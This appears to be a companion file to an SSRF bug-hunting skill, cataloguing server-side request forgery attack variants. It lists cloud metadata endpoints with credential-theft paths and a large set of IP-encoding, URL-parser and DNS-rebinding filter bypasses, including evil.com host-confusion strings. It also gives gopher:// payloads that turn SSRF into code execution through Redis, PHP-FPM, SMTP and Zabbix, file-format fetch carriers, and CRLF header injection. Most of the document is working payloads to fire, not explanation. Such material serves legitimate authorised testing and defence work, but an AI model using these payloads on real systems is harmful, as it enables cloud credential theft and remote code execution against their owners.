# SSRF — Exhaustive Attack-Vector Variant Matrix

Companion to `hunt-ssrf` (SKILL.md). That file carries the *hunting method* + OOB gate;
this file is the **catalog of every variant** to fire once you have a URL-accepting sink.
Run a sink through the whole matrix before calling it closed — the fence usually fails on
ONE encoding, not on the whole surface.

## 1. Cloud / IMDS endpoint matrix (ALL providers, not just the big three)

| provider | metadata endpoint | header needed | notes |
|---|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | none | v1 no token; `iam/security-credentials/<role>` → AKIA keys |
| AWS IMDSv2 | `http://169.254.169.254/latest/api/token` (PUT) | `X-aws-ec2-metadata-token-ttl-seconds` | token needs IMDSv2 handshake — SSRF often can't PUT; v1 downgrade wins |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` | also `http://169.254.169.254/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` | managed identity token: `/identity/oauth2/token?api-version=…&resource=…` |
| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` | none | ECS RAM role creds at `…/ram/security-credentials/<role>` — **most missed** |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | none | classic droplet metadata |
| Oracle OCI | `http://169.254.169.254/opc/v2/instance/` | `Authorization: Bearer Oracle` | IMDSv2-style; instance metadata |
| Tencent CVM | `http://metadata.tencentyun.com/latest/meta-data/` | none | also `http://169.254.0.23/` |
| Huawei Cloud | `http://169.254.169.254/latest/meta-data/` | none | ECS metadata, similar to AWS |
| Scaleway | `http://169.254.42.42/conf` | none | **non-standard IP** — extra reason to test it |
| Hetzner Cloud | `http://169.254.169.254/hetzner/v1/metadata/` | none | |
| Packet/Equinix | `http://metadata.packet.net/metadata` | none | |
| Kubernetes SA token | `file:///var/run/secrets/kubernetes.io/serviceaccount/token` | none | also `https://kubernetes.default.svc` |

**Test the non-standard IPs explicitly** (`169.254.42.42`, `100.100.100.200`,
`metadata.tencentyun.com`) — an allowlist built for "169.254.169.254" often leaves them open.

## 2. Protocol / scheme matrix (what each reaches)

| scheme | reaches | RCE/impact when reachable |
|---|---|---|
| `http://` `https://` | any reachable web | full-read / metadata read |
| `file://` | local filesystem | `/etc/passwd`, source, k8s SA token |
| `gopher://` | any TCP service (raw bytes) | **the RCE primitive** — see §6 |
| `dict://` | any TCP service (key=value) | redis/`dict://127.0.0.1:6379/INFO` |
| `ftp://` / `sftp://` | FTP bounce / SSRF pivot | banner + cred harvesting |
| `ldap://` `ldaps://` | directory services | `ldap://127.0.0.1:3890/%0A…` (Log4Shell-class) |
| `jar://` `netdoc://` `jython://` | Java URL protocol handlers | deser/classpath tricks on JVM stacks |
| `tftp://` `smb://` `nfs://` | legacy file shares | data exfil |
| `php://` `expect://` `data://` | PHP stream wrappers | `expect://id` = straight RCE on PHP |
| `ssh://` `git://` | git clone / ssh handshake | banner, fingerprint |
| `snmp://` `telnet://` | management planes | read community strings / banners |

**Two errors people make:** (a) assume the client library only binds http/https — most
URL fetchers use a general `URL`/`URI` parser and pass *any* scheme to a handler; (b)
forget `gopher://` is the universal byte pipe — if ANY scheme beyond http leaks through,
you control arbitrary bytes into an internal TCP service.

## 3. IP-encoding bypass matrix (exhaustive)

Fire every row at a host that blocks `127.0.0.1` / `169.254.169.254` in clear text:

```
# alternate literal forms of 127.0.0.1
127.0.0.1                127.1                2130706433          (decimal)
0x7f000001 / 0x7F.0.0.1  0177.0.0.1 / 017700000001   (octal)
127.0.1                  127.000.000.001      0                   (→0.0.0.0)

# IPv6
[::1]  [::]  [::ffff:127.0.0.1]  [::ffff:169.254.169.254]  [::ffff:a9fe:a9fe]

# IPv6-mapped for meta IPs
[0:0:0:0:0:ffff:a9fe:a9fe]   [::a9fe:a9fe]

# 0.0.0.0 / CGNAT / broad
0.0.0.0                   100.100.100.200      (Alibaba IMDS)
0xC0.0xA8.0x01            (192.168.0.1 hex)

# decimal / hex of ANY internal target (e.g. 192.168.0.1)
3232235521                 0xc0a80001            0300.0250.0000.0001
```

**Number of decode passes is the bug.** Test whether the param is decoded 1x/2x/base64
before the fetch:
```
url=http://169.254.169.254/          (clear)
url=http%3A%2F%2F169.254.169.254%2F  (1x encode)
url=http%253A%252F%252F169.254.169.254%252F  (2x encode)
url= base64("http://169.254.169.254/") embedded in path
```

## 4. URL parser differential / host-confusion matrix (modern fences)

The fence parses the host; the fetcher parses it *differently*. Every row is a distinct
parser quirk:

```
http://127.0.0.1/                          baseline
http://127.0.0.1:80@evil.com/              userinfo trick — host = evil.com or 127.0.0.1?
http://evil.com@127.0.0.1/                 @-split ambiguity
http://127.0.0.1#@evil.com/                fragment @
http://127.0.0.1%00.evil.com/              null-byte host
http://127.0.0.1%2f@evil.com/              encoded slash
http://127.0.0.1\@evil.com/                backslash @
http://evil.com\@127.0.0.1/                backslash hop
http://127.0.0.1\\evil.com/                double backslash
//169.254.169.254/                         scheme-relative (inherits http)
http:///169.254.169.254/                   empty-host + path
http:169.254.169.254/                      colon-no-slash (browser vs curl differ)
http://127.0.0.1./                         trailing dot (FQDN, survives some filters)
http://127。0。0。1/                         unicode fullwidth dots (many parsers idn-map)
http://⓪.0.0.1 / variations               unicode circled digits
http://127.0.0.1%5cevil.com/               encoded backslash
```

Confused-deputy hosts that RESOLVE to internal:
```
127.0.0.1.nip.io   [sslip-like services]  169.254.169.254.nip.io  10.0.0.1.nip.io
localtest.me      vcap.me                  10.0.0.1.xip.io
```

## 5. DNS rebinding / TOCTOU variants

The fence resolves the host once (public IP), the fetcher resolves again (internal):

```
# classic rebinding — rotate A record between public and 169.254.169.254
# lock.cmpxchg8b.com/rebinder.html generates the rebinding domain
# self-host: DNS server that alternates answers per query, 0 TTL

# modern single-check bypass: initial validation resolves public, fetch re-resolves
http://1u.ms/            (rebinding service)
http://r.jina.ai/…     no — jina is a reader proxy, not a rebinder; use lock.cmpxchg8b
```

Also worth firing (IPv6 AAAA rebinding — filter only checks A records):
```
host with A=8.8.8.8 + AAAA=::ffff:169.254.169.254   → IPv6-first clients hit internal
```

## 6. gopher:// → service RCE matrix (the blind-SSRF-to-RCE ladder)

`gopher://` ships raw bytes to any TCP port. For each internal service, the payload is a
URL-encoded byte string. The ones that convert blind-SSRF to code exec / data theft:

| service | gopher target | effect |
|---|---|---|
| Redis | `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall…` (Redis protocol via RESP) | `CONFIG SET dir /var/spool/cron` + `set x …` + `save` → cron RCE; or `SLAVEOF`/`REPLCONF` module load |
| Memcached | `gopher://127.0.0.1:11211/_set%20key%200%200%201%0d%0a…` | data poisoning / read arbitrary keys |
| Elasticsearch | `gopher://127.0.0.1:9200/_GET%20/_search…` | doc read / index dump |
| Docker socket | `gopher:///var/run/docker.sock` (via unix) or `http://127.0.0.1:2375/` | container escape / `POST /containers/create` |
| FastCGI (PHP-FPM) | `gopher://127.0.0.1:9000/_<FCGI record for PHP_VALUE auto_prepend_file=…>` | RCE via auto_prepend |
| SMTP | `gopher://127.0.0.1:25/_EHLO…MAIL FROM…RCPT TO…DATA…` | mail relay / SSRF-to-CSRF on email |
| MySQL | `gopher://127.0.0.1:3306/` | handshake → auth bypass / file read (`LOAD DATA LOCAL INFILE`) |
| Zabbix/others | `gopher://127.0.0.1:10050/_system.run[…]` | command exec |

**Golden rule — URL-encode the CRLF.** `\r\n` in the gopher payload must be `%0d%0a`
or the parser splits the request. `gopher://127.0.0.1:6379/_` + body, one `_` as the
first payload char (it is stripped).

## 7. Internal hostname / service-discovery matrix (no IP needed)

Internal DNS names the fence won't block because it only checks IP literals:

```
kubernetes.default.svc.cluster.local        (k8s API server)
metadata.google.internal                    (GCP, already in §1)
metadata.internal                           (some GKE aliases)
rabbitmq.default.svc.cluster.local          (named service → its ClusterIP)
redis.default.svc.cluster.local
<service>.<namespace>.svc.cluster.local
docker.for.mac.localhost / host.docker.internal   (dev host → host daemons)
gateway.docker.internal
consul.service.consul                        (Consul DNS)
<name>.svc                       (short k8s form, same namespace)
```

Fence often = `isPrivateIP(host)` on the parsed host; feed a *name* that resolves to a
private IP via the internal resolver and the check passes.

## 8. File-format SSRF carriers (unrelated to a `url=` param)

Server-side parsing of a caller-supplied file that fetches embedded refs:

```
SVG     <image xlink:href="http://169.254.169.254/…"/>  or <style>@import url(...)</style>
ImageMagick MVG  push graphic-context / viewbox … image over 0,0 'url(http://…)' (ImageTragick)
XLSX    <f><v>WEBSERVICE("http://169.254.169.254/…")</v></f>  or =HYPERLINK / external link
CSV     =WEBSERVICE(...) / =IMPORTXML(...)  (DDE / external-data formulas)
PDF     JS / openaction / external reference / /AA auto-open → fetch
DOCX/ODT  external image refs, linked OLE, <w:altChunk r:id=…>
XSL/XSLT  <xsl:include href="http://…"> / document()
XML/XSD  external DTD/entity → XXE-style SSRF (already a separate class, but the fetch is SSRF)
```

## 9. CRLF header injection for metadata auth (Azure/GCP need headers)

When the target is Azure IMDS (needs `Metadata: true`) or a fetch that needs a custom
header, inject the header via CRLF in a field the fetcher copies verbatim:

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01%0d%0aMetadata:true
Redirect-based: host an endpoint that 301s with a Location containing %0d%0aMetadata:true
```

## 10. Escalation ladder (severity rungs — proof rises per rung)

```
rung 1  DNS callback (OOB)                     → Informational
rung 2  port/host oracle (timing/error diff)    → Low-Medium
rung 3  private-range READ (internal body)      → Medium-High
rung 4  metadata credential read → cloud IAM    → Critical (chain cloud-iam-deep)
rung 5  gopher→Redis/FPM→RCE                    → Critical (chain hunt-rce)
```

Do not report below rung 2. A bare DNS callback is the never-submit gate.